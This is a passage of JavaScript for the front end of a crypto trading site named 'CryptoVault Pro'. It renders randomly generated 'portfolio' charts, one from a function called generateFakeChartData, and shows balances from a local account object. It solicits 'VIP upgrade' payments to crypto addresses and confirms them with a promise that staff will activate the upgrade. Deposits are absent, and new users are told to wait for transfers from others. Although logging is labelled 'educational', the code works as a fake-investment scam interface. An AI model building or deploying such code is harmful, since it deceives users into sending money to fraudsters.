    const userData = userAccounts[username];
    const baseValue = userData && userData.balance > 0 ? userData.balance * 0.95 : 1000;
    const data = [];
    let currentValue = baseValue;
    
    for (let i = 0; i < 24; i++) {
        const change = (Math.random() - 0.5) * (baseValue * 0.1);
        currentValue += change;
        data.push(Math.max(currentValue, baseValue * 0.9));
    }
    
    return data;
}

function generateTransactionId() {
    return 'TX' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substr(2, 5).toUpperCase();
}

function showError(message) {
    // Create error notification
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-notification';
    errorDiv.innerHTML = `
        <i class="fas fa-exclamation-circle"></i>
        <span>${message}</span>
    `;
    document.body.appendChild(errorDiv);
    
    setTimeout(() => {
        errorDiv.remove();
    }, 5000);
}

function showSuccess(message) {
    const successDiv = document.createElement('div');
    successDiv.className = 'success-notification';
    successDiv.innerHTML = `
        <i class="fas fa-check-circle"></i>
        <span>${message}</span>
    `;
    document.body.appendChild(successDiv);
    
    setTimeout(() => {
        successDiv.remove();
    }, 5000);
}

function isProtectedPage() {
    const protectedPages = ['dashboard.html', 'withdraw.html', 'transfer.html', 'vip.html', 'markets.html', 'portfolio.html', 'analytics.html', 'faq.html'];
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    return protectedPages.includes(currentPage);
}

function isAuthenticated() {
    return localStorage.getItem('loggedIn') === 'true';
}

function logEducationalEvent(action, details) {
    console.log(`📊 Educational Event: ${action}`, {
        timestamp: new Date().toISOString(),
        details: details,
        userAgent: navigator.userAgent
    });
}

// Enhanced VIP selection with auto-scroll
function selectVIP(level, amount) {
    document.getElementById('paymentSection').style.display = 'block';
    document.getElementById('paymentAmount').textContent = amount.toLocaleString();
    
    // Initialize with default network (TRON)
    selectPaymentNetwork('tron');
    
    // Scroll to the payment section with proper offset for mobile
    scrollToElement('paymentSection', 60);
    
    logEducationalEvent('vip_selection', { 
        level, 
        amount,
        defaultNetwork: 'tron'
    });
}

// Function to select payment network
function selectPaymentNetwork(network) {
    selectedPaymentNetwork = network;
    
    // Update UI
    document.querySelectorAll('.network-option').forEach(option => {
        option.classList.remove('active');
    });
    
    document.querySelector(`[onclick="selectPaymentNetwork('${network}')"]`).classList.add('active');
    
    // Update radio button
    document.querySelectorAll('input[name="paymentNetwork"]').forEach(radio => {
        radio.checked = false;
    });
    document.getElementById(`${network}-radio`).checked = true;
    
    // Update payment address and info
    updatePaymentInfo(network);
    
    // Smooth scroll to payment address section for better visibility
    setTimeout(() => {
        const addressSection = document.querySelector('.payment-address-section');
        if (addressSection) {
            addressSection.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });
        }
    }, 200);
    
    // Log selection for educational purposes
    logEducationalEvent('payment_network_selected', {
        network: network,
        networkName: paymentNetworks[network].name
    });
}

// Function to update payment information based on selected network
function updatePaymentInfo(network) {
    const networkData = paymentNetworks[network];
    
    // Update address
    document.getElementById('paymentAddress').textContent = networkData.address;
    
    // Update network note
    document.getElementById('networkNote').textContent = networkData.note;
    
    // Update warning text
    document.getElementById('warningText').textContent = networkData.warning;
    
    // Update QR info
    document.getElementById('qrNetworkInfo').textContent = networkData.qrInfo;
    
    // Update address display styling based on network
    const addressElement = document.getElementById('paymentAddress');
    addressElement.className = `address ${network}-address`;
}

// Updated copy function to copy the correct address
function copyPaymentAddress() {
    const address = paymentNetworks[selectedPaymentNetwork].address;
    navigator.clipboard.writeText(address).then(() => {
        showSuccess(`${paymentNetworks[selectedPaymentNetwork].name} address copied to clipboard!`);
    }).catch(() => {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = address;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        showSuccess(`${paymentNetworks[selectedPaymentNetwork].name} address copied to clipboard!`);
    });
}

// Updated confirm payment function to include network info
function confirmPayment() {
    const networkName = paymentNetworks[selectedPaymentNetwork].name;
    const networkCode = paymentNetworks[selectedPaymentNetwork].code;
    
    showSuccess(`Payment confirmation received for ${networkName} (${networkCode}). Our team will verify and activate your VIP status within 24 hours.`);
    
    logEducationalEvent('payment_attempted', {
        timestamp: new Date().toISOString(),
        user: localStorage.getItem('currentUser'),
        network: selectedPaymentNetwork,
        networkName: networkName,
        address: paymentNetworks[selectedPaymentNetwork].address
    });
}

function cancelPayment() {
    document.getElementById('paymentSection').style.display = 'none';
}

function showDeposit() {
    showSuccess('Deposit feature coming soon! Please use the transfer function for now.');
}

function logout() {
    clearUserSession();
    window.location.href = 'index.html';
}

// Enhanced mobile detection for better UX
function isMobileDevice() {
    return window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// Adjust scroll behavior for mobile
function mobileOptimizedScroll(elementId) {
    if (isMobileDevice()) {
        scrollToElement(elementId, 60); // Larger offset for mobile
    } else {
        scrollToElement(elementId, 20); // Smaller offset for desktop
    }
}

// Add these missing functions to app.js

// Initialize Markets page
function initMarketsPage() {
    loadUserData();
    // Markets page doesn't need special chart initialization
}

// Initialize FAQ page  
function initFAQPage() {
    loadUserData();
    // FAQ page doesn't need special initialization beyond user data
}

// Portfolio charts initialization (enhanced)
function initPortfolioCharts() {
    // Allocation Chart
    const allocationCtx = document.getElementById('allocationChart');
    if (allocationCtx) {
        new Chart(allocationCtx, {
            type: 'doughnut',
            data: {
                labels: ['USDT'],
                datasets: [{
                    data: [100],
                    backgroundColor: ['#26a17b'],
                    borderWidth: 0
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: false
                    }
                }
            }
        });
    }

    // Performance Chart
    const performanceCtx = document.getElementById('performanceChart');
    if (performanceCtx) {
        new Chart(performanceCtx, {
            type: 'line',
            data: {
                labels: generateTimeLabels(),
                datasets: [{
                    label: 'Portfolio Value',
                    data: generatePortfolioData(),
                    borderColor: '#2563eb',
                    backgroundColor: 'rgba(37, 99, 235, 0.1)',
                    borderWidth: 3,
                    fill: true,
                    tension: 0.4
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: false
                    }
                },
                scales: {
                    y: {
                        beginAtZero: false,
                        grid: {
                            color: '#374151'
                        },
                        ticks: {
                            color: '#9ca3af',
                            callback: function(value) {
                                return '$' + value.toLocaleString();
                            }
                        }
                    },
                    x: {
                        grid: {
                            color: '#374151'
                        },
                        ticks: {
                            color: '#9ca3af'
                        }
                    }
                }
            }
        });
    }
}

// Add missing page initialization to the switch statement
// Update the switch statement in your DOMContentLoaded event:
switch(currentPage) {
    case 'index.html':
    case '':
        initLoginPage();
        break;
    case 'dashboard.html':
        initDashboard();
        break;
    case 'transfer.html':
        initTransferPage();
        break;
    case 'withdraw.html':
        initWithdrawPage();
        break;
    case 'register.html':
        initRegisterPage();
        break;
    case 'vip.html':
        initVIPPage();
        break;
    case 'portfolio.html':
        initPortfolioPage();
        break;
    case 'analytics.html':
        initAnalyticsPage();
        break;
    case 'markets.html':
        initMarketsPage();
        break;
    case 'faq.html':
        initFAQPage();
        break;
    default:
        break;
}

function initWithdrawPage() {
    loadUserData();
    // Redirect to transfer page since we're using transfer page for withdrawals
    window.location.href = 'transfer.html';
}

// Update the updateUIVisibility function to better handle new accounts
function updateUIVisibility(displaySettings) {
    // Hide/show 24h P&L
    const pnlElements = document.querySelectorAll('.balance-card:nth-child(3)');
    pnlElements.forEach(element => {
        if (displaySettings.show24hPnL) {
            element.style.display = 'block';
        } else {
            element.style.display = 'none';
        }
    });
    
    // Hide/show transaction history section
    const transactionSections = document.querySelectorAll('.transactions-section, .transaction-history-section');
    transactionSections.forEach(element => {
        if (displaySettings.showTransactions) {
            element.style.display = 'block';
        } else {
            element.style.display = 'none';
        }
    });
    
    // Hide/show chart sections for new accounts
    const chartSections = document.querySelectorAll('.chart-section, .performance-section');
    chartSections.forEach(element => {
        if (displaySettings.showPerformanceChart) {
            element.style.display = 'block';
        } else {
            element.innerHTML = `
                <div class="no-data-state">
                    <i class="fas fa-chart-line"></i>
                    <h3>No Trading History</h3>
                    <p>Start trading to see your performance charts</p>
                </div>
            `;
        }
    });
    
    // For new accounts, show different content on portfolio/analytics pages
    if (displaySettings.isNewAccount) {
        // Fix Portfolio Overview for new accounts
        const portfolioOverview = document.querySelector('.portfolio-overview');
        if (portfolioOverview) {
            portfolioOverview.innerHTML = `
                <div class="new-account-welcome">
                    <h1>Welcome to CryptoVault Pro</h1>
                    <div class="total-value">
                        <span class="value-label">Total Portfolio Value</span>
                        <div class="value-amount">$0.00</div>
                        <div class="value-change neutral">
                            <i class="fas fa-info-circle"></i>
                            <span>Start by receiving transfers from other users</span>
                        </div>
                    </div>
                </div>
                <div class="portfolio-actions">
                    <button class="action-btn primary" onclick="location.href='transfer.html'">
                        <i class="fas fa-exchange-alt"></i>
                        <span>Receive Transfer</span>
                    </button>
                    <button class="action-btn secondary" onclick="location.href='vip.html'">
                        <i class="fas fa-crown"></i>
                        <span>Upgrade VIP</span>
                    </button>
                </div>
            `;
        }
        
        // Fix Analytics Grid for new accounts
        const analyticsGrid = document.querySelector('.analytics-grid');
        if (analyticsGrid) {
            analyticsGrid.innerHTML = `
                <div class="new-account-state">
                    <i class="fas fa-chart-bar"></i>
                    <h2>No Analytics Data</h2>
                    <p>Your analytics will appear here once you start trading</p>
                </div>
            `;
        }

        // Fix Portfolio Allocation for new accounts
        const portfolioAllocation = document.querySelector('.portfolio-allocation');
        if (portfolioAllocation) {
            portfolioAllocation.innerHTML = `
                <div class="new-account-state">
                    <i class="fas fa-wallet"></i>
                    <h2>No Holdings</h2>
                    <p>Your portfolio will appear here once you receive funds</p>
                </div>
            `;
        }

        // Fix Holdings List for new accounts
        const holdingsList = document.querySelector('.holdings-list');
        if (holdingsList) {
            holdingsList.innerHTML = `
                <div class="no-data-state">
                    <i class="fas fa-coins"></i>
                    <h3>No Assets</h3>
                    <p>Receive transfers to see your holdings here</p>
                </div>
            `;
        }
    }
}

// Update the updateBalanceElements function to use current user data ONLY
function updateBalanceElements(userData) {
    const currentUsername = localStorage.getItem('currentUser');
    
    // Only update if this is the current user's data
    if (!userData || !currentUsername) return;
    
    const balanceElement = document.getElementById('totalBalance');
    if (balanceElement) {
        balanceElement.textContent = userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }
    
    const usdtBalanceElement = document.getElementById('totalBalanceUSDT');
    if (usdtBalanceElement) {
        usdtBalanceElement.textContent = userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }
    
    const availableBalanceElement = document.getElementById('availableBalance');
    if (availableBalanceElement) {
        availableBalanceElement.textContent = userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // Update portfolio page specific elements ONLY for current user
    const portfolioValueElement = document.querySelector('.value-amount');
    if (portfolioValueElement) {
        portfolioValueElement.textContent = '$' + userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // Update holdings breakdown ONLY for current user
    const holdingAmountElements = document.querySelectorAll('.holding-amount .amount');
    holdingAmountElements.forEach(element => {
        element.textContent = userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    });

    const holdingValueElements = document.querySelectorAll('.holding-value');
    holdingValueElements.forEach(element => {
        element.textContent = '$' + userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    });
}

// Fix the analytics cards to show user-specific data
function updateAnalyticsCards(userData, displaySettings) {
    if (displaySettings.isNewAccount) {
        // Don't update analytics cards for new accounts
        return;
    }

    // Portfolio Growth card
    const portfolioGrowthCard = document.querySelector('.analytics-card .card-value');
    if (portfolioGrowthCard) {
        const growth = userData.pnl24h || 0;
        portfolioGrowthCard.textContent = '+$' + growth.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // Update percentage change
    const percentageElement = document.querySelector('.analytics-card .card-percentage');
    if (percentageElement && userData.balance > 0) {
        const percentage = ((userData.pnl24h || 0) / userData.balance * 100).toFixed(2);
        percentageElement.textContent = '+' + percentage + '%';
    }
}

// Update the loadUserData function to include analytics updates
function loadUserData() {
    const username = localStorage.getItem('currentUser');
    if (username && userAccounts[username]) {
        currentUser = username;
        const userData = userAccounts[username];
        const displaySettings = getUserDisplaySettings(username);
        
        // Update UI elements across all pages
        const userElements = document.querySelectorAll('#currentUser');
        userElements.forEach(element => {
            element.textContent = username;
        });
        
        const vipElements = document.querySelectorAll('#userVipBadge');
        vipElements.forEach(element => {
            element.textContent = `VIP ${userData.vipLevel}`;
        });
        
        // Update balance elements for CURRENT USER ONLY
        updateBalanceElements(userData);
        
        // Update current user balance in transfer forms
        updateTransferBalanceDisplay(userData);
        
        // Update UI visibility based on account type
        updateUIVisibility(displaySettings);
        
        // Update analytics cards with user-specific data
        updateAnalyticsCards(userData, displaySettings);
        
        // Update transaction history
        updateTransactionHistory(userData, displaySettings);
        
    } else {
        // If user not found, redirect to login
        clearUserSession();
        if (isProtectedPage()) {
            window.location.href = 'index.html';
        }
    }
}

// Fix the generatePortfolioData function to use current user's data
function generatePortfolioData() {
    const username = localStorage.getItem('currentUser');
    const userData = userAccounts[username];
    
    // For new accounts with 0 balance, return flat zero data
    if (!userData || userData.balance === 0) {
        return Array(24).fill(0);
    }
    
    const baseValue = userData.balance * 0.95;
    const data = [];
    let currentValue = baseValue;
    
    for (let i = 0; i < 24; i++) {
        const change = (Math.random() - 0.5) * (baseValue * 0.05); // Smaller changes for realism
        currentValue += change;
        data.push(Math.max(currentValue, baseValue * 0.9));
    }
    
    return data;
}

// Fix the generateFakeChartData function
function generateFakeChartData() {
    const username = localStorage.getItem('currentUser');
    const userData = userAccounts[username];
    
    // For new accounts with 0 balance, return flat zero data
    if (!userData || userData.balance === 0) {
        return Array(24).fill(0);
    }
    
    const baseValue = userData.balance * 0.95;
    const data = [];
    let currentValue = baseValue;
    
    for (let i = 0; i < 24; i++) {
        const change = (Math.random() - 0.5) * (baseValue * 0.05);
        currentValue += change;
        data.push(Math.max(currentValue, baseValue * 0.9));
    }
    
    return data;
}

// Update initPortfolioPage function
function initPortfolioPage() {
    loadUserData();
    setTimeout(() => {
        const username = localStorage.getItem('currentUser');
        const displaySettings = getUserDisplaySettings(username);
        
        // Only show charts if user has data
        if (displaySettings.showPortfolio && !displaySettings.isNewAccount) {
            initPortfolioCharts();
        }
    }, 100);
}

// Update initAnalyticsPage function  
function initAnalyticsPage() {
    loadUserData();
    setTimeout(() => {
        const username = localStorage.getItem('currentUser');
        const displaySettings = getUserDisplaySettings(username);
        
        // Only show analytics if user has data
        if (displaySettings.showAnalytics && !displaySettings.isNewAccount) {
            initAnalyticsCharts();
        }
    }, 100);
}

// Add this at the beginning of your app.js file

// Mobile scroll and touch fixes
document.addEventListener('DOMContentLoaded', function() {
    // Fix iOS scroll issues
    if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
        document.body.style.webkitOverflowScrolling = 'touch';
    }

    // Fix viewport height on mobile
    function setVH() {
        let vh = window.innerHeight * 0.01;
        document.documentElement.style.setProperty('--vh', `${vh}px`);
    }

    setVH();
    window.addEventListener('resize', setVH);
    window.addEventListener('orientationchange', function() {
        setTimeout(setVH, 100);
    });

    // Prevent zoom on input focus for iOS
    if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
        const inputs = document.querySelectorAll('input, select, textarea');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                input.style.fontSize = '16px';
            });
        });
    }

    // Fix mobile navigation
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    
    // Add header restructure for mobile
    if (window.innerWidth <= 768) {
        const header = document.querySelector('.app-header');
        if (header) {
            const headerLeft = header.querySelector('.header-left');
            const headerRight = header.querySelector('.header-right');
            const headerCenter = header.querySelector('.header-center');

            if (headerLeft && headerRight && headerCenter) {
                // Create top row container
                const topRow = document.createElement('div');
                topRow.className = 'header-top-row';
                
                // Move logo and user profile to top row
                topRow.appendChild(headerLeft);
                topRow.appendChild(headerRight);
                
                // Clear header and rebuild
                header.innerHTML = '';
                header.appendChild(topRow);
                header.appendChild(headerCenter);
            }
        }
    }
});
